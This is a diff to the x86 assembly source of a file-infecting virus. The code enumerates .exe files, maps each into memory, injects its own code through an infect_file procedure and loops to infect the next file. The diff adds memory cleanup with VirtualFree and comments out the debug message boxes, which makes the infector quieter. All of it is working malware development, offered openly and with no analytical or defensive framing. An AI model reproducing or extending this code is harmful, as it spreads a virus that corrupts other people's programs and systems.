@@ -24,6 +24,7 @@ ENDM
 	; LOCAL	readfile_addr:DWORD
 	; LOCAL	setfilepointer_addr:DWORD
 	; LOCAL	virtualalloc_addr:DWORD
+	; LOCAL	virtualfree_addr:DWORD
 	; LOCAL	writefile_addr:DWORD
 
 	lea		ecx, win32finddata
@@ -80,17 +81,17 @@ search_exe_loop:
 
 ; --------------------------------------> OK guys, now we have our file mapped in memory. Let's inject some code !
 
-	invoke	infect_file, fileptr, virtualalloc_addr		; Procedure to properly inject our code into the file of interest.
+	invoke	infect_file, fileptr, virtualalloc_addr, virtualfree_addr		; Procedure to properly inject our code into the file of interest.
 
-	cmp		eax, 0								; DEBUG: if eax == 0 sth went wrong, print debug
-	jne		infect_dbg							; DEBUG
-	push	0									; DEBUG
-	lea		ecx, [ebx + offset dbg_infectfail]	; DEBUG
-	push	ecx									; DEBUG
-	push	ecx									; DEBUG
-	push	0									; DEBUG
-	call	messagebox_addr						; DEBUG
-infect_dbg:										; DEBUG
+	; cmp		eax, 0								; DEBUG: if eax == 0 sth went wrong, print debug
+	; jne		infect_dbg							; DEBUG
+	; push	0									; DEBUG
+	; lea		ecx, [ebx + offset dbg_infectfail]	; DEBUG
+	; push	ecx									; DEBUG
+	; push	ecx									; DEBUG
+	; push	0									; DEBUG
+	; call	messagebox_addr						; DEBUG
+; infect_dbg:										; DEBUG
 
 	push	0							; 0 = from beginning of the file
 	push	0							; 0 = no high order DWORD for size to move
@@ -113,6 +114,11 @@ infect_dbg:										; DEBUG
 	push	filehandle
 	call	closehandle_addr			; We close the file because we are not pigs.
 
+	push	08000h
+	push	0
+	push	fileptr
+	call	virtualfree_addr
+
 ; --------------------------------------> Now, we can look for another .exe file before looping.
 
 open_failed:
@@ -123,16 +129,16 @@ open_failed:
 	cmp		eax, 0
 	je		exit_search_exe				; FindNextFile returned 0, file not found. Time to leave the loop, as no more files were found.
 
-	jmp		no_syserr
+	; jmp		no_syserr							; DEBUG
 syserr:
-	push	0									; DEBUG
-	lea		ecx, [ebx + offset dbg_sysfail]		; DEBUG
-	push	ecx									; DEBUG
-	push	ecx									; DEBUG
-	push	0									; DEBUG
-	call	messagebox_addr						; DEBUG
+	; push	0									; DEBUG
+	; lea		ecx, [ebx + offset dbg_sysfail]		; DEBUG
+	; push	ecx									; DEBUG
+	; push	ecx									; DEBUG
+	; push	0									; DEBUG
+	; call	messagebox_addr						; DEBUG
+;no_syserr:										; DEBUG
 
-no_syserr:
 	jmp		search_exe_loop				; Loop to infect next file.
 
 exit_search_exe:
